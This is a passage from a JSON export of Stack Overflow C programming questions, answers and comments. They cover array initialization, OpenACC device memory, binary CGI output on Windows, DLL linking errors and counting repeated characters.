rand();\n   uint8_t foo[] = {bar ? 9U:20U};\n}\n</code></pre>\n\n<p>Furthermore, for objects with automatic storage duration, you aren't limited to constant expressions as the two sub-expressions of the conditional expression. They can refer to any object in scope as well.</p>\n"}], "owner": {"reputation": 157, "user_id": 4039207, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/6ed35267961546abaae338b80f713747?s=128&d=identicon&r=PG&f=1", "display_name": "user259819", "link": "https://stackoverflow.com/users/4039207/user259819"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 149, "favorite_count": 0, "accepted_answer_id": 48657440, "answer_count": 2, "score": 6, "last_activity_date": 1517986040, "creation_date": 1517984066, "question_id": 48657128, "link": "https://stackoverflow.com/questions/48657128/ternary-operator-in-array-initalization", "title": "Ternary operator in array initalization", "body": "<p>Is using the tenary operator within array initalization with constants valid C99?</p>\n\n<pre><code>uint8_t foo[] = {bar? 9U:20U};\n</code></pre>\n"}, {"tags": ["c", "openacc"], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 9325621, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-_d9SIR55mII/AAAAAAAAAAI/AAAAAAAAAAc/l2k6JBD4P3I/photo.jpg?sz=128", "display_name": "Bradley Meyers", "link": "https://stackoverflow.com/users/9325621/bradley-meyers"}, "edited": false, "score": 0, "creation_date": 1518046526, "post_id": 48670936, "comment_id": 84348713, "body": "Ok, thanks Mat. I changed the code around so that instead of calling <code>create_test_array</code>, I just create it as <code>arr[nsamples][nchan][npol]</code> and that solved my problem (at least in terms of the memory issues). I suppose it&#39;s because now the array is all in one place in memory and so doesn&#39;t need to do the ridiculous amount of point creation and copying."}, {"owner": {"reputation": 406, "user_id": 2469182, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a0a1a1c569677c1d74d957c39edd43df?s=128&d=identicon&r=PG", "display_name": "wtf8_decode", "link": "https://stackoverflow.com/users/2469182/wtf8-decode"}, "edited": false, "score": 0, "creation_date": 1574112418, "post_id": 48670936, "comment_id": 104107743, "body": "I had this very same issue and converting it into an array fixed it. However, I don&#39;t see the math behind this. Why would 20000+20000x128 be too much when it is only about 2.5M positions, if every position takes 8 bytes this would add up to a total of 40MB which is less than 0.1% of memory on a GTX 950. Thank you very much!"}, {"owner": {"reputation": 3901, "user_id": 3204484, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/F7Cc9.jpg?s=128&g=1", "display_name": "Mat Colgrove", "link": "https://stackoverflow.com/users/3204484/mat-colgrove"}, "edited": false, "score": 0, "creation_date": 1574265208, "post_id": 48670936, "comment_id": 104172223, "body": "It&#39;s not the size of the memory that&#39;s the problem, it&#39;s the larger number &quot;attaches&quot; (setting the device pointers) and small data transfers given that transfers can only be made in contiguous blocks."}, {"owner": {"reputation": 406, "user_id": 2469182, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a0a1a1c569677c1d74d957c39edd43df?s=128&d=identicon&r=PG", "display_name": "wtf8_decode", "link": "https://stackoverflow.com/users/2469182/wtf8-decode"}, "edited": false, "score": 0, "creation_date": 1574286883, "post_id": 48670936, "comment_id": 104183021, "body": "Thank you very much for your reply. I was getting out of memory errors before converting it into an array, so this definitely fixed it. Regardless of potential performance issues, why would this change make it fit on the device memory? &quot;but 128+2x128 attaches is a lot less than 20000+20000x128&quot; But even if that many pointers are required, there&#39;s no way to fill 2GiB of device memory. That is the part I don&#39;t understand. Again, thank you very much for your help."}], "tags": [], "owner": {"reputation": 3901, "user_id": 3204484, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/F7Cc9.jpg?s=128&g=1", "display_name": "Mat Colgrove", "link": "https://stackoverflow.com/users/3204484/mat-colgrove"}, "is_accepted": true, "score": 1, "last_activity_date": 1518028236, "creation_date": 1518028236, "answer_id": 48670936, "question_id": 48656869, "link": "https://stackoverflow.com/questions/48656869/openacc-running-out-of-device-memory-when-copying-3d-array-to-device/48670936#48670936", "title": "openACC: Running out of device memory when copying 3D array to device", "body": "<p>This is actually a very poor data layout for the GPU.  The problem being that the compiler must match the structure on the GPU and hence needs to create an array of pointers, then for each, create a second array or pointers and \"attach\" the pointer to it's parent.  \"attach\" means that it will fill in the device pointer in it's proper spot in the parent array but must launch a kernel to do it.  Worse, it then needs to traverse the structure again to create the third dimension and again attach the pointers.  The third dimension is also padded for alignment which is where the extra memory is coming from.  The causes a lot of extra overhead and will severely impact your performance.</p>\n\n<p>Also since data transfers between the host and device can only be done on contiguous blocks, the runtime must traverse the structure and copy only 2 elements at a time.  Again, causing a high overhead.</p>\n\n<p>If you can swap the \"nsamples\" and \"npol\" dimensions, you'll still have some overhead but 128+2x128 attaches is a lot less than 20000+20000x128.</p>\n\n<p>Alternatively, you can use CUDA Unified Memory (-ta=tesla:managed) to have the CUDA runtime do the data movement for you.  The compiler no longer needs to create the GPU data structure nor attach the pointers.  </p>\n\n<p>A third option would be to linearize the array (i.e. make it a 1D array) and then compute the index in the loop.</p>\n"}], "owner": {"reputation": 13, "user_id": 9325621, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-_d9SIR55mII/AAAAAAAAAAI/AAAAAAAAAAc/l2k6JBD4P3I/photo.jpg?sz=128", "display_name": "Bradley Meyers", "link": "https://stackoverflow.com/users/9325621/bradley-meyers"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 186, "favorite_count": 0, "accepted_answer_id": 48670936, "answer_count": 1, "score": 1, "last_activity_date": 1518028236, "creation_date": 1517982829, "question_id": 48656869, "link": "https://stackoverflow.com/questions/48656869/openacc-running-out-of-device-memory-when-copying-3d-array-to-device", "title": "openACC: Running out of device memory when copying 3D array to device", "body": "<p>I'm new to using openACC and am trying to figure out specifically what's going on when I used the <code>copyin</code> data directive (specifically in C). </p>\n\n<p>I have a 3D array and am trying to copy it to the device to do some computation. The problem I have is that when I do the copy, the device runs out of memory, even though by my estimates the array should only be ~40 MB (20000 x 128 x 2 array of floats). I'm using a GTX 950 and when running there is over 1 GB of free memory available (checked using <code>nvidia-smi</code>).</p>\n\n<p>Here's the code I'm using to test. I compiled it with\n<code>pgcc -acc -Minfo -o copytest copytest.c</code></p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n\nfloat ***create_test_array( int nsamples, int nchan, int npol )\n{\n    int s, ch; // Loop variables\n    float ***array;\n\n    array = (float ***)malloc( nsamples * sizeof(float **) );\n\n    for (s = 0; s &lt; nsamples; s++)\n    {\n        array[s] = (float **)malloc( nchan * sizeof(float *) );\n\n        for (ch = 0; ch &lt; nchan; ch++)\n            array[s][ch] = (float *)malloc( npol * sizeof(float) );\n    }\n\n    return array;\n}\n\n\n\nvoid test_copy( int nsamples, int nchan, int npol, float ***arr)\n{\n#pragma acc data pcopyin(arr[0:nsamples][0:nchan][0:npol])\n#pragma acc kernels\n    for (int pol = 0; pol &lt; npol; pol++)\n    {\n        for (int ch = 0; ch &lt; nchan; ch++)\n        {\n            for (int s = 0; s &lt; nsamples; s++)\n            {\n                arr[s][ch][pol] = 0.0;\n            }\n        }\n\n    }\n}\n\n\nvoid main()\n{\n    int nsamples = 10000;\n    int nchan = 128;\n    int npol = 2;\n    float ***test_array = create_test_array( 2*nsamples, nchan, npol );\n\n    test_copy( 2*nsamples, nchan, npol, test_array );\n}\n</code></pre>\n\n<p>Any insight is much appreciated. </p>\n"}, {"tags": ["c", "windows", "apache"], "comments": [{"owner": {"reputation": 4709, "user_id": 2001149, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/SqsJM.png?s=128&g=1", "display_name": "Santosh A", "link": "https://stackoverflow.com/users/2001149/santosh-a"}, "edited": false, "score": 0, "creation_date": 1517982518, "post_id": 48656727, "comment_id": 84311256, "body": "Is the size of <code>cat_downloaded_linux</code> 68,603 bytes? (i,e same as <code>cat_original.jpg</code>)"}, {"owner": {"reputation": 29294, "user_id": 2659313, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9828b91aef4c2b3cf14f3501e0a20e33?s=128&d=identicon&r=PG", "display_name": "Mohit Jain", "link": "https://stackoverflow.com/users/2659313/mohit-jain"}, "edited": false, "score": 0, "creation_date": 1517982550, "post_id": 48656727, "comment_id": 84311264, "body": "Type of <code>ch</code> should be <code>int</code>"}, {"owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "edited": false, "score": 0, "creation_date": 1517983582, "post_id": 48656727, "comment_id": 84311636, "body": "Why? Just let Aoache serve the actual file itself. Your CGI is adding no value."}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user9325641"}, "edited": false, "score": 0, "creation_date": 1517988566, "post_id": 48656978, "comment_id": 84313882, "body": "<code>_setmode</code> is not a standard library function."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1517988685, "post_id": 48656978, "comment_id": 84313930, "body": "@t2533799: No, of course <code>_setmode()</code> isn&#39;t standard as defined by ISO 9899 or POSIX.  It&#39;s a Microsoft function needed to make things work on Microsoft&#39;s Windows.  But that&#39;s the platform where the OP has a problem, so it is appropriate to offer the help there."}, {"owner": {"user_type": "does_not_exist", "display_name": "user9325641"}, "edited": false, "score": 0, "creation_date": 1517988773, "post_id": 48656978, "comment_id": 84313970, "body": "Yes, <code>_setmode</code> is very useful. But, is there alternative way to solve my problem?"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1517988851, "post_id": 48656978, "comment_id": 84314007, "body": "I dunno; you&#39;ll have to wait for someone else to proffer an alternative solution.  I don&#39;t know of another way of dealing with binary files written to standard output on Windows.  You might find something on a site like \u2014 oh, maybe Stack Overflow.  I&#39;ve not tried searching for duplicates yet."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1517989261, "post_id": 48656978, "comment_id": 84314231, "body": "Searching SO with &#39;<code>[c] binary standard output windows</code>&#39; throws up some candidates: <a href=\"https://stackoverflow.com/questions/40609260/\">Portable way to put stdout in binary mode</a>\u2014<a href=\"https://stackoverflow.com/questions/19839883/\">Why when we write \\n in the file it converts into \\r\\n combination</a>\u2014<a href=\"https://stackoverflow.com/questions/9554252/\">Is it possible to pass binary data through the console</a>\u2014<a href=\"https://stackoverflow.com/questions/28781430/\">Simple encryption/decryption algorithm causing EOF</a>. You may want to follow some of the links from some of the answers to at least some of those questions."}, {"owner": {"reputation": 29355, "user_id": 205580, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/460e6e299e385fd46df156c85a1dd55f?s=128&d=identicon&r=PG", "display_name": "Eryk Sun", "link": "https://stackoverflow.com/users/205580/eryk-sun"}, "edited": false, "score": 0, "creation_date": 1517992983, "post_id": 48656978, "comment_id": 84316087, "body": "I upvoted, but I think it needs to be clarified that this is the behavior of Microsoft C/C++ on Windows, which specifically implements text mode in its low-level POSIX emulation layer. The Windows I/O system has no notion of text mode. It&#39;s all just bytes to the OS."}], "tags": [], "owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "is_accepted": true, "score": 3, "last_activity_date": 1517983355, "creation_date": 1517983355, "answer_id": 48656978, "question_id": 48656727, "link": "https://stackoverflow.com/questions/48656727/error-with-binary-writting-mode-with-c-on-windows/48656978#48656978", "title": "Error with binary-writting mode with C, on Windows?", "body": "<p>When you use <code>printf()</code> to write to standard output, it is working in text mode, not binary mode, so every time your program encounters a newline <code>\\n</code> in the JPEG file, it writes <code>\\r\\n</code> on Windows, which corrupts the JPEG file.</p>\n\n<p>You'll need to know how to put standard output into binary mode and you'll need to ensure that you generate <code>\\r\\n</code> in place of <code>\\n</code> in the headers.</p>\n\n<p>The MSDN documentation says you can use <a href=\"https://msdn.microsoft.com/en-us/library/tw4k6df8.aspx\" rel=\"nofollow noreferrer\"><code>_setmode()</code></a>, and shows an example (setting <code>stdin</code> instead of <code>stdout</code>):</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;io.h&gt;\n\nint main(void)  \n{  \n    int result;  \n\n    // Set \"stdin\" to have binary mode:  \n    result = _setmode(_fileno(stdin), _O_BINARY);  \n    if (result == -1)\n        perror(\"Cannot set mode\");  \n    else  \n        printf(\"'stdin' successfully changed to binary mode\\n\");  \n}\n</code></pre>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user9325641"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 182, "favorite_count": 0, "accepted_answer_id": 48656978, "answer_count": 1, "score": 0, "last_activity_date": 1518003443, "creation_date": 1517982143, "last_edit_date": 1518003443, "question_id": 48656727, "link": "https://stackoverflow.com/questions/48656727/error-with-binary-writting-mode-with-c-on-windows", "title": "Error with binary-writting mode with C, on Windows?", "body": "<p>I am learning how to write a simple CGI page with C language. I tried with Apache on both Linux and Windows. I compiled my scripts on 2 different computers that run different OSes.</p>\n\n<hr>\n\n<ol>\n<li>Firstly, I created a simple CGI page for getting a static plain-text content:</li>\n</ol>\n\n<pre>    #include \n\n    int main()\n    {\n        FILE *fp = fopen(\"plain_text.txt\", \"r\"); // text-mode only.\n\n        if (fp)\n        {\n            int ch;\n\n            printf(\"content-type: text/plain\\n\\n\");\n\n            while ((ch = fgetc(fp)) != EOF)\n            {\n                printf(\"%c\", ch);\n            }\n\n            fclose(fp);\n        }\n\n        return 0;\n    }</pre>\n\n<p>I compiled it into an executable and put it in <code>cgi-bin</code> directory. When I browse it with my web-browser, it returns the plain-text content correctly (both Linux and Windows).</p>\n\n<hr>\n\n<ol start=\"2\">\n<li>Then, I modified above script for getting a simple JPEG content.\n(I understand that: every JPEG picture is a binary file)</li>\n</ol>\n\n<pre>   #include \n\n    int main()\n    {\n        FILE *fp = fopen(\"cat_original.jpg\", \"rb\"); // with binary-mode.\n\n        if (fp)\n        {\n            int ch;\n\n            printf(\"content-type: image/jpg\\n\\n\");\n\n            while (((ch = fgetc(fp)) != EOF) || (!feof(f1))) // can read whole content of any binary file.\n            {\n                printf(\"%c\", ch);\n            }\n\n            fclose(fp);\n        }\n\n        return 0;\n    }</pre>\n\n<p>I compiled it into an executable and put it in <code>cgi-bin</code> directory, too.\nI can get the correct returned-image with Linux compiled-executable files; but, the Windows does not.</p>\n\n<hr>\n\n<p>To understand the problem, I downloaded the returned-image with Windows compiled-execute files.\n(I named this image: <code>cat_downloaded_windows.jpg</code>)\nThen, I used VBinDiff for compare 2 images: <code>cat_original.jpg</code> (68,603 bytes) and <code>cat_downloaded_windows.jpg</code> (68,871 bytes).\nThere are many lines in <code>cat_downloaded_windows.jpg</code> (like the row I marked) have a character which <code>cat_original.jpg</code> does not have.</p>\n\n<p><a href=\"https://i.stack.imgur.com/XwAus.jpg\" rel=\"nofollow noreferrer\">VBinDiff</a></p>\n\n<p>So, I guess that the Windows OS causes the problem (Windows add some characters automatically, and Linux does not)\n(Apache and web-browsers do not cause problem)</p>\n\n<hr>\n\n<p>So, I posted this topic into StackOverflow for getting your helps. I have 2 questions:</p>\n\n<ol>\n<li>Is there any problem with the <code>printf(\"%c\", ch);</code> (in my script) on Windows?</li>\n<li>Is there any way to print binary content into <code>stdout</code>, both Linux and Windows?</li>\n</ol>\n\n<p>I am learning programming myself, and this is the first time I ask on StakOverflow.\nSo, if my question is not clear, please comment below this question; I will try to explain it more.</p>\n\n<p>Thank you for your time!</p>\n"}, {"tags": ["c", "c++11", "dll", "linker-errors", "lib"], "comments": [{"owner": {"reputation": 513, "user_id": 8293226, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ccfWx.png?s=128&g=1", "display_name": "mustachioed", "link": "https://stackoverflow.com/users/8293226/mustachioed"}, "edited": false, "score": 0, "creation_date": 1517980298, "post_id": 48656393, "comment_id": 84310537, "body": "Did you get this error when you tried running the generated executable file?"}, {"owner": {"reputation": 539, "user_id": 8666851, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/e7676d687d1d340a61a3662f48b617be?s=128&d=identicon&r=PG&f=1", "display_name": "Edward Severinsen", "link": "https://stackoverflow.com/users/8666851/edward-severinsen"}, "reply_to_user": {"reputation": 513, "user_id": 8293226, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ccfWx.png?s=128&g=1", "display_name": "mustachioed", "link": "https://stackoverflow.com/users/8293226/mustachioed"}, "edited": false, "score": 0, "creation_date": 1517980597, "post_id": 48656393, "comment_id": 84310629, "body": "I linked to all of these files with their full path names. Ex: &quot;C:\\TDM-GCC-64\\x86_64-w64-mingw32\\...&quot;. And I just tried running the exe in the debug folder and got the same problem."}, {"owner": {"reputation": 539, "user_id": 8666851, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/e7676d687d1d340a61a3662f48b617be?s=128&d=identicon&r=PG&f=1", "display_name": "Edward Severinsen", "link": "https://stackoverflow.com/users/8666851/edward-severinsen"}, "reply_to_user": {"reputation": 513, "user_id": 8293226, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ccfWx.png?s=128&g=1", "display_name": "mustachioed", "link": "https://stackoverflow.com/users/8293226/mustachioed"}, "edited": false, "score": 0, "creation_date": 1517980938, "post_id": 48656393, "comment_id": 84310732, "body": "@ateesdalejr Added <code>libquickmail-0.dll</code> to my project folder and it stopped giving me that error. Now its giving me an error for libcurl4.dll"}, {"owner": {"reputation": 513, "user_id": 8293226, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ccfWx.png?s=128&g=1", "display_name": "mustachioed", "link": "https://stackoverflow.com/users/8293226/mustachioed"}, "edited": false, "score": 0, "creation_date": 1517981101, "post_id": 48656393, "comment_id": 84310783, "body": "Has TDM-GCC&#39;s bin directory been added to your path? Also, do you have libcurl installed?"}, {"owner": {"reputation": 539, "user_id": 8666851, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/e7676d687d1d340a61a3662f48b617be?s=128&d=identicon&r=PG&f=1", "display_name": "Edward Severinsen", "link": "https://stackoverflow.com/users/8666851/edward-severinsen"}, "reply_to_user": {"reputation": 513, "user_id": 8293226, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ccfWx.png?s=128&g=1", "display_name": "mustachioed", "link": "https://stackoverflow.com/users/8293226/mustachioed"}, "edited": false, "score": 0, "creation_date": 1518017003, "post_id": 48656393, "comment_id": 84332362, "body": "I don&#39;t have its bin directory added to my path and after a long time I have not been able to download libcurl dll. I have no idea where it&#39;s located. Every zip file I&#39;ve downloaded has not had it."}], "answers": [{"tags": [], "owner": {"reputation": 513, "user_id": 8293226, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ccfWx.png?s=128&g=1", "display_name": "mustachioed", "link": "https://stackoverflow.com/users/8293226/mustachioed"}, "is_accepted": true, "score": 2, "last_activity_date": 1537905388, "last_edit_date": 1537905388, "creation_date": 1517980902, "answer_id": 48656517, "question_id": 48656393, "link": "https://stackoverflow.com/questions/48656393/code-execution-cannot-proceed-because-libquickmail-0-dll-was-not-found/48656517#48656517", "title": "Code execution cannot proceed because libquickmail-0.dll was not found?", "body": "<p>Either copy the <code>libquickmail-0.dll</code> to the same directory as your linked executable or add the libquickmail <code>bin</code> directory to your path. This will allow Windows to find the DLL to run the executable.</p>\n"}], "owner": {"reputation": 539, "user_id": 8666851, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/e7676d687d1d340a61a3662f48b617be?s=128&d=identicon&r=PG&f=1", "display_name": "Edward Severinsen", "link": "https://stackoverflow.com/users/8666851/edward-severinsen"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2023, "favorite_count": 0, "accepted_answer_id": 48656517, "answer_count": 1, "score": 0, "last_activity_date": 1537905388, "creation_date": 1517980094, "question_id": 48656393, "link": "https://stackoverflow.com/questions/48656393/code-execution-cannot-proceed-because-libquickmail-0-dll-was-not-found", "title": "Code execution cannot proceed because libquickmail-0.dll was not found?", "body": "<p>I was looking for a quick and easy way to automatically send a file to my gmail for debugging purposes on multiple remote machines. However I am apparently having linking issues which I can't seem to solve.</p>\n\n<p>I downloaded the win64 zip file of <a href=\"https://sourceforge.net/projects/libquickmail/\" rel=\"nofollow noreferrer\">libquick</a>, IDE is CodeBlocks, compile target is x64 and running on 64-bit Windows 10.</p>\n\n<p>There were 10 files that came in the zip folder, in lib/include/bin. They were </p>\n\n<p>bin > <code>libquickmail-0.dll</code>, <code>libquickmaillight-0.dll</code>, <code>quickmaillight.exe</code>. </p>\n\n<p>include > <code>quickmail.h</code>. </p>\n\n<p>lib > <code>libquickmail.a</code>, <code>libquickmail.dll.a</code>, <code>libquickmail.la</code>, <code>libquickmaillight.a</code>, <code>libquickmaillight.dll.a</code>, <code>libquickmaillight.la</code>.</p>\n\n<p>I linked to all of the <code>.a</code>/<code>.dll.a</code>/<code>.la</code> and <code>.dll</code> files and it still gives me this error: <code>Code execution cannot proceed because libquickmail-0.dll was not found</code></p>\n\n<p>I have no idea what the problem is and am very open to ideas. Thank you for your time.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 1, "creation_date": 1517980454, "post_id": 48656303, "comment_id": 84310584, "body": "On each new character, check if it&#39;s the same as the one you saw last. If  it is, increment counter. If it&#39;s not, print counter, then reset counter and set &quot;last seen char&quot; to this new one."}, {"owner": {"reputation": 59, "user_id": 9323869, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/29f889c966e86ccc640fa9208abfaf3e?s=128&d=identicon&r=PG&f=1", "display_name": "holahola", "link": "https://stackoverflow.com/users/9323869/holahola"}, "reply_to_user": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1517981072, "post_id": 48656303, "comment_id": 84310769, "body": "Thanks for the reply , Since i am a beginner I don&#39;t quite get what do you mean by check if its the same one as last. The command line is only able to take one word at one time."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 1, "creation_date": 1517981109, "post_id": 48656303, "comment_id": 84310784, "body": "What @SergioTulentsev said.  That means you need to save the character that <code>getchar()</code> returns, but remember it returns an <code>int</code>, not a <code>char</code>, and also save the last character that was read (so you can compare the new with the old, and then save the new as the old).  You get <code>10</code> because you counted the newline too."}, {"owner": {"reputation": 897, "user_id": 3830887, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9aa739aedfb6760abc3605091e12810e?s=128&d=identicon&r=PG&f=1", "display_name": "TonyB", "link": "https://stackoverflow.com/users/3830887/tonyb"}, "edited": false, "score": 0, "creation_date": 1517982595, "post_id": 48656303, "comment_id": 84311281, "body": "I would also suggest &quot;nc&quot; should be defined as an &quot;int&quot; instead of a &quot;double&quot;... because its value will always be an integer, you will never have a &quot;partial&quot; character."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1517986032, "post_id": 48656303, "comment_id": 84312699, "body": "@holahola you want to search &quot;<i>frequency array</i>&quot;, which is a simple scheme where you use an array initialized to all zero (with size of the number of possible object in your set, e.g. <code>26</code> if concerned with the frequency of lower-case character, e.g. <code>int charfreq[26] = {0};</code>) You then determine how to normalize your set so that the results corresponds to the indexes of the array (e.g. <code>somelowerchar - &#39;a&#39;</code> would make <code>&#39;a&#39; - &#39;a&#39; = 0;</code>, <code>&#39;b&#39; - &#39;a&#39; = 1;</code>, etc.. Then as you loop over each char, <code>while ((c = getchar()) != EOF) { if (&#39;a&#39; &lt;= c &amp;&amp; c &lt;= &#39;z&#39;) charfreq[c - &#39;a&#39;]++; }</code> The array is key."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1518024209, "post_id": 48656303, "comment_id": 84337346, "body": "a very good test word is &#39;mississippi"}], "answers": [{"tags": [], "owner": {"reputation": 4598, "user_id": 9264702, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mHczh.jpg?s=128&g=1", "display_name": "Stephen Docy", "link": "https://stackoverflow.com/users/9264702/stephen-docy"}, "is_accepted": false, "score": 1, "last_activity_date": 1517991414, "last_edit_date": 1517991414, "creation_date": 1517984564, "answer_id": 48657244, "question_id": 48656303, "link": "https://stackoverflow.com/questions/48656303/c-programming-how-to-count-number-of-repetition-of-letter-in-a-word/48657244#48657244", "title": "C programming - How to count number of repetition of letter in a word", "body": "<p>you are missing two things, saving the last reviewed char and resetting the counter when updating it...</p>\n\n<pre><code>int c, prev = -1, count = 0;\nwhile ((c = getchar()) != '\\n') {\n    /* if the current char is the same as the last one reviewed increment counter*/\n    if (c == prev) {\n        count++;\n    }\n    else {\n        /* handle the start condition of prev */\n        if (prev != -1) {\n            printf(\"%d\", count);\n        }\n        /* update the prev char reviewed */\n        prev = c;\n        /* reset the counter - upon char change */\n        count = 1;\n    }\n}\n/* print out count for final letter */\nprintf(\"%d\", count);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 13767, "user_id": 2413201, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/rxfuw.jpg?s=128&g=1", "display_name": "Armali", "link": "https://stackoverflow.com/users/2413201/armali"}, "edited": false, "score": 0, "creation_date": 1517987859, "post_id": 48657970, "comment_id": 84313549, "body": "Very nicely put answer, but you misinterpreted the question, ignoring all examples of expected output."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "reply_to_user": {"reputation": 13767, "user_id": 2413201, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/rxfuw.jpg?s=128&g=1", "display_name": "Armali", "link": "https://stackoverflow.com/users/2413201/armali"}, "edited": false, "score": 0, "creation_date": 1517987948, "post_id": 48657970, "comment_id": 84313597, "body": "What do you mean? He has <code>xxxyyyzzzz</code> yielding <code>x is repeated 3 times, y 3 and z 4times</code> -- which is exactly what this does. If you want, e.g. <code>211111...344</code>, just change the <code>printf</code> to output sequential integers and remove the character identification. The concept is 100% the same."}, {"owner": {"reputation": 13767, "user_id": 2413201, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/rxfuw.jpg?s=128&g=1", "display_name": "Armali", "link": "https://stackoverflow.com/users/2413201/armali"}, "edited": false, "score": 0, "creation_date": 1517988009, "post_id": 48657970, "comment_id": 84313624, "body": "I mean e. g. <i>If the input is xxyxx the output should be 212.</i>"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "reply_to_user": {"reputation": 13767, "user_id": 2413201, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/rxfuw.jpg?s=128&g=1", "display_name": "Armali", "link": "https://stackoverflow.com/users/2413201/armali"}, "edited": false, "score": 0, "creation_date": 1517988087, "post_id": 48657970, "comment_id": 84313674, "body": "That is a <i>change the printf statement</i> issue and if I would have done that the learning aspect of the lesson would have been compromised."}, {"owner": {"reputation": 13767, "user_id": 